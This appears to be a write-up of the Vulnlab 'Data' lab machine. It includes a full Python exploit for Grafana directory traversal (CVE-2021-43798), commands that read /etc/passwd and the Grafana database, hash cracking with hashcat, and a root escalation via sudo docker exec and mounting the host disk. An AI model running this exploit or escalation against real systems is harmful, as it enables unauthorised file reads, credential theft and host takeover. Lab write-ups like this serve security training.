---
title: "[Vulnlab] Data"
date: 2025-08-01 15:00:00 -500 
categories: [Vulnlab,Data (Linux)]
tags: [AD,redteam,hacking,ctf,vulnlab]
author: Christoph K
---


# Introduction

### Hint:

```bash
User
Crack those Hashes (rockyou.txt is enough).

Root
Look into privileged containers.
```



![Data](assets/img/vulnlab/data/01.png)


# Portscan

```bash
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7c:36:5f:77:f9:6a:71:4d:9a:3d:22:45:4e:ea:d4:1a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDE69o+8D57rP8LXANNdK5zoZASq311MKxRQ6/GbjmFSBW3bnwis4VBWDf7JzwfQW8pWvIt+rFvV+gJca+8CTGEv9D+4YfS4vLqx5JsseRM8Mmjp16NX3DY4YFSxm5+dvEac50WiE74CP2hdJuhEZ0zEJ1XDkgEzELY4lLHPR9o0Xa6Q66IYowTUcZ7zuIYWzOyHK8/obiOtJOui2KyiJ5Zjkum6u7ToRkyTLZHlL3xtgbhfBlrvSL7ltCZy0S07AFXaUoZZDofF/NJt+L5yA/nEd3kh88TIYfyPzW0H3fFnTYejfVQ86Z/NMWAHRrrgLYasBb8AMg50+C6FV2JibNz
|   256 51:a9:be:35:a2:43:47:2a:08:4b:d5:33:2c:7b:9b:51 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBATh0bqMrMDXvrXrGt9wsMUKHkRQyTO1zYvhR+xShPKpe6uMrEveSR657M8MeraAqSgHaMv914XoLnraab4CZ1U=
|   256 46:e0:fd:20:1d:4d:26:91:ef:0b:00:48:a4:48:10:0a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIQzsT6cfNf+TZPwNViYXdtDTenhY+g2HtxJAoqPC8w4

3000/tcp open  http    syn-ack ttl 62 Grafana http
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: C308E3090C62A6425B30B4C38883196B
|_http-trane-info: Problem with XML parsing of /evox/about
| http-robots.txt: 1 disallowed entry 
|_/
| http-title: Grafana
|_Requested resource was /login
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 4.15 - 5.19 (96%), Linux 4.15 (96%), Linux 5.4 (96%), Android 9 - 10 (Linux 4.9 - 4.14) (92%), Android 12 (Linux 5.4) (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.7 - 4.19 (92%), Synology DiskStation Manager 5.1 (Linux 3.2) (92%)
No exact OS matches for host (test conditions non-ideal).

```

## HTTP Enumeration (Port 3000)

### Checking Website

- Found Grafana Login on Port 3000
- Version 8.0.0 Grafana

![Grafana](assets/img/vulnlab/data/02.png)

### Searching for Exploits

- Found `CVE-2021-43798`

[NVD - cve-2021-43798](https://nvd.nist.gov/vuln/detail/cve-2021-43798)

- POC Python Script

[Packet Storm](https://packetstorm.news/files/id/165221)

```python
# Exploit Title: Grafana 8.3.0 - Directory Traversal and Arbitrary File Read
# Date: 08/12/2021
# Exploit Author: s1gh
# Vendor Homepage: https://grafana.com/
# Vulnerability Details: https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p
# Version: V8.0.0-beta1 through V8.3.0
# Description: Grafana versions 8.0.0-beta1 through 8.3.0 is vulnerable to directory traversal, allowing access to local files.
# CVE: CVE-2021-43798
# Tested on: Debian 10
# References: https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p47p

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import argparse
import sys
from random import choice

plugin_list = [
    "alertlist",
    "annolist",
    "barchart",
    "bargauge",
    "candlestick",
    "cloudwatch",
    "dashlist",
    "elasticsearch",
    "gauge",
    "geomap",
    "gettingstarted",
    "grafana-azure-monitor-datasource",
    "graph",
    "heatmap",
    "histogram",
    "influxdb",
    "jaeger",
    "logs",
    "loki",
    "mssql",
    "mysql",
    "news",
    "nodeGraph",
    "opentsdb",
    "piechart",
    "pluginlist",
    "postgres",
    "prometheus",
    "stackdriver",
    "stat",
    "state-timeline",
    "status-histor",
    "table",
    "table-old",
    "tempo",
    "testdata",
    "text",
    "timeseries",
    "welcome",
    "zipkin"
]

def exploit(args):
    s = requests.Session()
    headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.' }

    while True:
        file_to_read = input('Read file > ')

        try:
            url = args.host + '/public/plugins/' + choice(plugin_list) + '/../../../../../../../../../../../../..' + file_to_read
            req = requests.Request(method='GET', url=url, headers=headers)
            prep = req.prepare()
            prep.url = url
            r = s.send(prep, verify=False, timeout=3)

            if 'Plugin file not found' in r.text:
                print('[-] File not found\n')
            else:
                if r.status_code == 200:
                    print(r.text)
                else:
                    print('[-] Something went wrong.')
                    return
        except requests.exceptions.ConnectTimeout:
            print('[-] Request timed out. Please check your host settings.\n')
            return
        except Exception:
            pass

def main():
    parser = argparse.ArgumentParser(description="Grafana V8.0.0-beta1 - 8.3.0 - Directory Traversal and Arbitrary File Read")
    parser.add_argument('-H',dest='host',required=True, help="Target host")
    args = parser.parse_args()

    try:
        exploit(args)
    except KeyboardInterrupt:
        return

if __name__ == '__main__':
    main()
    sys.exit(0)
```

### Exploiting CVE

- Using Python Script for Path Traversal
- test with `/etc/passwd`

```bash
└─# python3 exploit.py -H http://data.vl:3000
Read file > /etc/passwd
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
grafana:x:472:0:Linux User,,,:/home/grafana:/sbin/nologin

```

- Researching grafana database location
- Instead of showing the content I added following lines in the script to save the output properly (`Grafana.DB`)

```bash
with open(file_to_read.strip("/").replace("/", "_"), "wb") as f:
                        f.write(r.content)
                    print(f"[+] Saved file to {file_to_read.strip('/').replace('/', '_')}")
```
- Saving the `grafana.db` from `/var/lib/grafana/grafana.db`

- Opening the db file with `sqlite3`

- Getting the hashes from admin

```bash
sqlite> .tables
alert                       login_attempt             
alert_configuration         migration_log             
alert_instance              org                       
alert_notification          org_user                  
alert_notification_state    playlist                  
alert_rule                  playlist_item             
alert_rule_tag              plugin_setting            
alert_rule_version          preferences               
annotation                  quota                     
annotation_tag              server_lock               
api_key                     session                   
cache_data                  short_url                 
dashboard                   star                      
dashboard_acl               tag                       
dashboard_provisioning      team                      
dashboard_snapshot          team_member               
dashboard_tag               temp_user                 
dashboard_version           test_data                 
data_source                 user                      
library_element             user_auth                 
library_element_connection  user_auth_token           
sqlite> select * from user;
1|0|admin|admin@localhost||7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8|YObSoLj55S|hLLY6QQ4Y6||1|1|0||2022-01-23 12:48:04|2022-01-23 12:48:50|0|2022-01-23 12:48:50|0

```

### Cracking hash from grafana.db

- Converting hashes to hashcat 
[grafana2hashcat-Github](https://github.com/iamaldi/grafana2hashcat)


```bash
┌──(root㉿kali)-[/home/kali/vulnlab/data]
└─# python3 grafana2hashcat.py hash.txt -o crack_hashes.txt

[+] Grafana2Hashcat
[+] Reading Grafana hashes from:  hash.txt
[+] Done! Read 2 hashes in total.
[+] Converting hashes...
[+] Converting hashes complete.
[+] Writing output to 'crack_hashes.txt' file.
[+] Now, you can run Hashcat with the following command, for example:

hashcat -m 10900 hashcat_hashes.txt --wordlist wordlist.txt
```

- Cracking hashes

```bash
└─# hashcat -m 10900 crack_hashes.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-penryn-13th Gen Intel(R) Core(TM) i7-13700HX, 2918/5900 MB (1024 MB allocatable), 1MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=:beautiful1

```

- we have a login: `boris:beautiful1`

### Getting user flag

- Connecting via `ssh` with user `boris`

```bash
┌──(root㉿kali)-[/home/kali/vulnlab/data]
└─# ssh boris@data.vl      
The authenticity of host 'data.vl (10.10.76.193)' can't be established.
ED25519 key fingerprint is SHA256:49Cy8E9iW/C6xT/eKujcEUsEc2ucq+IhYoESIA51f5g.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'data.vl' (ED25519) to the list of known hosts.
boris@data.vl's password: 
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-1060-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Aug 10 15:49:59 UTC 2025

  System load:  0.0               Processes:              99
  Usage of /:   19.8% of 7.69GB   Users logged in:        0
  Memory usage: 24%               IP address for eth0:    10.10.76.193
  Swap usage:   0%                IP address for docker0: 172.17.0.1

0 updates can be applied immediately.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sun Jan 23 13:11:53 2022 from 10.10.1.254
boris@ip-10-10-10-11:~$ 

```

- Userflag: `VL{Redacted}`

# Privilege Escalation

## Checking Permissions

- Checking root permissions without passwd:

```bash
boris@ip-10-10-10-11:~$ sudo -l
Matching Defaults entries for boris on ip-10-10-10-11:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User boris may run the following commands on ip-10-10-10-11:
    (root) NOPASSWD: /snap/bin/docker exec *

```

- Using `ps  -aux` to find the container

```bash
boris@ip-10-10-10-11:/$ ps aux |grep docker
root       871  0.0  8.2 1430692 82172 ?       Ssl  13:44   0:02 dockerd --group docker --exec-root=/run/snap.docker --data-root=/var/snap/docker/common/var-lib-docker --pidfile=/run/snap.docker/docker.pid --config-file=/var/snap/docker/1125/config/daemon.json
root      1291  0.0  4.3 1351052 44048 ?       Ssl  13:44   0:03 containerd --config /run/snap.docker/containerd/containerd.toml --log-level error
root      1610  0.0  0.3 1152452 3484 ?        Sl   13:44   0:00 /snap/docker/1125/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 3000 -container-ip 172.17.0.2 -container-port 3000
root      1615  0.0  0.3 1152452 3476 ?        Sl   13:44   0:00 /snap/docker/1125/bin/docker-proxy -proto tcp -host-ip :: -host-port 3000 -container-ip 172.17.0.2 -container-port 3000
root      1631  0.0  0.8 711708  8300 ?        Sl   13:44   0:01 /snap/docker/1125/bin/containerd-shim-runc-v2 -namespace moby -id e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 -address /run/snap.docker/containerd/containerd.sock
472       1662  0.0  6.3 775596 64112 ?        Ssl  13:44   0:04 grafana-server --homepath=/usr/share/grafana --config=/etc/grafana/grafana.ini --packaging=docker cfg:default.log.mode=console cfg:default.paths.data=/var/lib/grafana cfg:default.paths.logs=/var/log/grafana cfg:default.paths.plugins=/var/lib/grafana/plugins cfg:default.paths.provisioning=/etc/grafana/provisioning
boris     3490  0.0  0.0  14860   968 pts/0    S+   16:11   0:00 grep --color=auto docker
boris@ip-10-10-10-11:/$ 

```

- Found container `e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81`
- Using `docker exec` to open the docker container in /bin/sh

```bash
boris@ip-10-10-10-11:/$ lsblk
NAME    MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT
loop0     7:0    0  42.2M  1 loop /snap/snapd/14066
loop1     7:1    0 116.6M  1 loop /snap/docker/1125
loop2     7:2    0    25M  1 loop /snap/amazon-ssm-agent/4046
loop3     7:3    0  55.5M  1 loop /snap/core18/2253
xvda    202:0    0     8G  0 disk 
└─xvda1 202:1    0     8G  0 part /

```

- Creating a new directory under `/mnt`
- `Mount` the whole drive to the folder
- Reading the contents

```bash
boris@ip-10-10-10-11:/tmp$ sudo /snap/bin/docker exec -u 0 -it e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 /bin/sh
/usr/share/grafana # mkdir -p /mnt/privesc
/usr/share/grafana # mount /dev/xvda1 /mnt/privesc/
/usr/share/grafana # cd /mnt/privesc/
/mnt/privesc # cd root
/mnt/privesc/root # ls
root.txt  snap
/mnt/privesc/root # cat root.txt
VL{Redacted}
/mnt/privesc/root # 

```

- Rootflag: `VL{Redacted}`
